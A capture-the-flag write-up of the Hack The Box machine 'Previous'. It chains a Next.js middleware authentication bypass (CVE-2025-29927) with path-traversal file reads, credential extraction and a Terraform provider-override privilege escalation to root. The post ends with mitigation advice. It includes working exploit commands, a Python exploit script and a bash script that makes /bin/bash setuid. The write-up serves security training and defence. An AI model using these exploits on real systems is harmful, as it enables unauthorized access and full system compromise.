---
title: "Previous HTB Machine Walkthrough: Exploiting Next.js Authentication Bypass and Terraform Privilege Escalation"
seoTitle: "Next.js Bypass & Terraform Escalation Guide"
seoDescription: "Hack The Box walkthrough: Next.js auth bypass and Terraform privilege escalation highlight modern web vulnerabilities"
datePublished: Thu Sep 04 2025 14:30:22 GMT+0000 (Coordinated Universal Time)
cuid: cmf5i6pqe000102ib4z8ze4pe
slug: previous-htb-machine-walkthrough-exploiting-nextjs-authentication-bypass-and-terraform-privilege-escalation
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756996162282/9e93f11a-2b9e-4fbd-a275-154d928b59ba.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1756996199002/ef4db880-363b-41f1-80cb-172af5272cca.png
tags: ctf, htb, ctf-writeup, htb-machines, htb-writeup

---

## Introduction

Previous is a Linux machine from Hack The Box that showcases modern web application vulnerabilities, specifically targeting Next.js authentication bypass (CVE-2025-29927) and Terraform privilege escalation. This walkthrough demonstrates a complete penetration testing methodology from initial reconnaissance to root access.

## Machine Information

* **Target IP**: 10.10.11.83
    
* **Hostname**: previous.htb
    
* **Difficulty**: Medium
    
* **Operating System**: Ubuntu Linux
    

## Initial Reconnaissance

### Host Discovery and Port Scanning

First, I added the target to my hosts file:

```bash
echo "10.10.11.83 previous.htb" >> /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995217443/cd3075ab-d185-4c59-96b6-7e28de95b10d.png align="center")

Using rustscan for efficient port discovery:

```bash
rustscan -a previous.htb -- -A
```

**Results:**

```php
Open 10.10.11.83:22
Open 10.10.11.83:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

### Web Application Analysis

#### Directory Enumeration

Using dirsearch to discover hidden directories and files:

```bash
dirsearch -u http://previous.htb
```

**Key findings:**

* Multiple `/api` endpoints requiring authentication
    
* `/signin` page available
    
* All API routes redirect to authentication
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995262177/f1d52f5f-3822-4afa-ac44-a35451376e0a.png align="center")

*Image 2: PreviousJS homepage showing the main application interface*

#### Technology Stack Identification

Using Wappalyzer and manual analysis:

* **Framework**: Next.js 15.2.2
    
* **Web Server**: nginx 1.18.0
    
* **Authentication**: NextAuth.js
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995287187/b6575a17-f575-4769-8680-54411d20015c.png align="center")

*Image 3: Wappalyzer results showing Next.js 15.2.2*

The 404 error page confirmed Next.js usage:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995308786/d72f9e15-5cc0-45a3-98a9-1be0d23e4a93.png align="center")

*Image 4: Next.js 404 error page revealing framework information*

## Vulnerability Research and Exploitation

### CVE-2025-29927: Next.js Authentication Bypass

#### Vulnerability Details

CVE-2025-29927 is a high-severity vulnerability in Next.js that allows attackers to bypass authorization checks implemented via middleware. The vulnerability exploits the internal HTTP header `x-middleware-subrequest` used by Next.js to prevent recursive requests.

**How it works:**

1. Next.js uses the `x-middleware-subrequest` header internally
    
2. When this header is present, middleware execution is skipped
    
3. Attackers can add this header to bypass authentication checks
    
4. Only affects self-hosted Next.js applications using `next start` with `output: standalone`
    

#### Exploitation Technique

The vulnerability is exploited by adding the following HTTP header:

```bash
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

Initial test to confirm the bypass:

```bash
curl 'http://previous.htb/api/download?example=aaa' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -v
```

### API Endpoint Discovery

With the authentication bypass, I could enumerate the `/api` directory:

```bash
dirsearch -u http://previous.htb/api \
-H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Critical finding:**

* `/api/download` endpoint with parameter requirement
    

### Parameter Fuzzing

Using ffuf to discover required parameters:

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=a' \
-w /usr/share/fuzzDicts/paramDict/AllParam.txt \
-H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
-mc all -fw 2
```

**Result:**

* Parameter `example` discovered with special behavior
    

### Local File Inclusion (LFI) Exploitation

Testing for file inclusion vulnerabilities:

```bash
curl 'http://previous.htb/api/download?example=../../../../etc/passwd' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Success! Retrieved** `/etc/passwd`:

```php
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
[... truncated ...]
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

**Key users identified:**

* `node` (UID 1000)
    
* `nextjs` (UID 1001)
    

#### Environment Variable Discovery

Checking process environment variables:

```bash
curl 'http://previous.htb/api/download?example=../../../../proc/self/environ' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Results:**

```php
NODE_VERSION=18.20.8
HOSTNAME=0.0.0.0
YARN_VERSION=1.22.22
SHLVL=1
PORT=3000
HOME=/home/nextjs
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NEXT_TELEMETRY_DISABLED=1
PWD=/app
NODE_ENV=production
```

**Critical information:**

* Application runs from `/app` directory
    
* Next.js production environment
    

### Next.js Application Structure Analysis

#### Route Configuration Discovery

Examining the Next.js routes manifest:

```bash
curl 'http://previous.htb/api/download?example=../../../../app/.next/routes-manifest.json' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -s | jq
```

**Key routes discovered:**

```json
{
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$"
    }
  ]
}
```

#### Authentication Configuration Extraction

Retrieving the NextAuth.js configuration:

```bash
curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Deobfuscated JavaScript reveals credentials:**

```javascript
authorize: async e => 
  e?.username === "jeremy" && 
  e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") 
  ? {id:"1", name:"Jeremy"} : null
```

**Extracted credentials:**

* **Username**: `jeremy`
    
* **Password**: `MyNameIsJeremyAndILovePancakes`
    

## Initial Access

### SSH Authentication

Using the discovered credentials:

```bash
ssh jeremy@previous.htb
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995341870/faed30ea-588a-4122-884f-f1709a32fe20.png align="center")

*Image 5: Successful SSH login as jeremy user*

**User flag captured:**

```php
jeremy@previous:~$ cat user.txt
4006abca533f75c----------------
```

## Privilege Escalation

### Sudo Privileges Analysis

Checking sudo permissions:

```bash
sudo -l
```

**Results:**

```php
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir=/opt/examples apply
```

**Critical security configuration:**

* `!env_reset`: Environment variables are preserved
    
* `env_delete+=PATH`: PATH variable is cleared
    
* Can run Terraform with root privileges in `/opt/examples`
    

### Terraform Configuration Analysis

Examining the Terraform configuration:

```bash
cat /opt/examples/main.tf
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995380704/cf925b98-1ffd-4932-99dc-d82b100c7eed.png align="center")

*Image 6: Contents of the* [*main.tf*](http://main.tf) *Terraform configuration file*

**Configuration details:**

```php
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
      version = "0.1"
    }
  }
}

provider "examples" {}

resource "examples_file" "test" {
  path = "/tmp/test"
  content = "Hello, World!"
}
```

### Terraform Provider Override Exploitation

#### Understanding the Attack Vector

Terraform allows development overrides for providers, enabling local provider binaries to be used instead of official ones. This can be exploited when:

1. We can control the Terraform configuration directory
    
2. We can set environment variables
    
3. We have execution privileges
    

#### Creating Malicious Provider

**Step 1: Create the malicious provider binary**

```bash
mkdir -p /home/jeremy/privesc/
nano /home/jeremy/privesc/terraform-provider-examples_v0.1_linux_amd64
```

**Malicious provider content:**

```bash
#!/bin/bash
chmod u+s /bin/bash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995419507/0e8d6037-98b8-4f7e-9546-cdc55ca94b21.png align="center")

*Image 7: Creating the malicious Terraform provider binary*

**Step 2: Make the provider executable**

```bash
chmod +x /home/jeremy/privesc/terraform-provider-examples_v0.1_linux_amd64
```

**Step 3: Create Terraform CLI configuration**

```bash
nano /home/jeremy/privesc/dev.tfrc
```

**Configuration content:**

```php
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/home/jeremy/privesc"
  }
  direct {}
}
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995433319/ad0c1192-d597-4991-933a-64af1f4e3b3d.png align="center")

*Image 8: Creating the Terraform CLI configuration file*

#### Executing the Privilege Escalation

**Step 4: Set environment variable and execute**

```bash
export TF_CLI_CONFIG_FILE=/home/jeremy/privesc/dev.tfrc
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756995451906/d687e663-008b-4c20-a69c-89c668975e22.png align="center")

*Image 9: Successful execution of the Terraform privilege escalation*

**Step 5: Verify root access**

```bash
/bin/bash -p
```

The `-p` flag preserves the setuid bit, granting effective root privileges.

**Root flag captured:**

```bash
cat /root/root.txt
f4a8b3f3efccd749c36331e3e14035bb
```

## Technical Analysis

### Attack Chain Summary

1. **Reconnaissance**: Discovered Next.js 15.2.2 application
    
2. **Vulnerability Research**: Identified CVE-2025-29927 authentication bypass
    
3. **Exploitation**: Used `X-Middleware-Subrequest` header to bypass authentication
    
4. **LFI Exploitation**: Leveraged `/api/download` for local file inclusion
    
5. **Credential Discovery**: Extracted hardcoded credentials from Next.js configuration
    
6. **Initial Access**: SSH authentication with discovered credentials
    
7. **Privilege Escalation**: Terraform provider override with sudo privileges
    

### Security Implications

#### CVE-2025-29927 Impact

* **Severity**: High (CVSS likely 8.0+)
    
* **Affected Versions**: Next.js &lt; 13.5.9, 14.2.25, 15.2.3
    
* **Attack Vector**: Network (Remote)
    
* **Authentication Required**: None
    
* **User Interaction**: None
    

#### Mitigation Strategies

**For CVE-2025-29927:**

1. **Immediate**: Update Next.js to patched versions
    
2. **Temporary**: Filter requests containing `x-middleware-subrequest` header
    
3. **Architecture**: Use platforms like Vercel that aren't affected
    
4. **Monitoring**: Log and alert on suspicious header usage
    

**For Terraform Privilege Escalation:**

1. **Sudo Configuration**: Avoid `!env_reset` with sensitive commands
    
2. **Path Control**: Maintain strict PATH controls
    
3. **Provider Security**: Validate Terraform provider sources
    
4. **Least Privilege**: Limit sudo permissions to specific operations
    

### Code Exploits

#### Authentication Bypass Exploit

```python
#!/usr/bin/env python3
import requests
import sys

def exploit_nextjs_auth_bypass(target_url, file_path):
    """
    Exploit CVE-2025-29927 Next.js authentication bypass
    """
    headers = {
        'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware'
    }
    
    payload = f"../../../../{file_path}"
    url = f"{target_url}/api/download?example={payload}"
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            return f"Error: HTTP {response.status_code}"
    except requests.RequestException as e:
        return f"Request failed: {e}"

# Usage
if __name__ == "__main__":
    target = "http://previous.htb"
    file_to_read = "etc/passwd"
    
    result = exploit_nextjs_auth_bypass(target, file_to_read)
    print(result)
```

#### Terraform Privilege Escalation Script

```bash
#!/bin/bash
# Terraform Provider Override Privilege Escalation

# Create directory structure
mkdir -p /tmp/privesc

# Create malicious provider
cat > /tmp/privesc/terraform-provider-examples_v0.1_linux_amd64 << 'EOF'
#!/bin/bash
# Malicious Terraform provider
chmod u+s /bin/bash
echo "Provider executed successfully"
EOF

chmod +x /tmp/privesc/terraform-provider-examples_v0.1_linux_amd64

# Create Terraform CLI config
cat > /tmp/privesc/dev.tfrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp/privesc"
  }
  direct {}
}
EOF

# Export config and execute
export TF_CLI_CONFIG_FILE=/tmp/privesc/dev.tfrc

echo "Executing Terraform with malicious provider..."
sudo /usr/bin/terraform -chdir=/opt/examples apply

echo "Checking for setuid bash..."
ls -la /bin/bash

echo "Attempting privilege escalation..."
/bin/bash -p
```

## Conclusion

The Previous machine demonstrates the critical importance of:

1. **Regular Security Updates**: CVE-2025-29927 highlights how framework vulnerabilities can completely bypass authentication
    
2. **Secure Configuration Management**: Hardcoded credentials and insecure sudo configurations create significant attack vectors
    
3. **Defense in Depth**: Multiple security layers could have prevented this complete compromise
    
4. **Environment Security**: Development features like Terraform provider overrides can be weaponized in production environments
    

This walkthrough showcases modern attack techniques against popular frameworks and the importance of comprehensive security assessments covering both application and system-level vulnerabilities.

### Key Takeaways

* **Framework Security**: Stay updated with framework security advisories
    
* **Configuration Security**: Avoid hardcoded credentials and insecure sudo permissions
    
* **Attack Surface**: Consider all components in the attack surface, including build tools
    
* **Monitoring**: Implement detection for suspicious authentication bypass attempts
    

The combination of a critical web application vulnerability with system misconfiguration created a path from anonymous access to complete system compromise, emphasizing the interconnected nature of modern security challenges.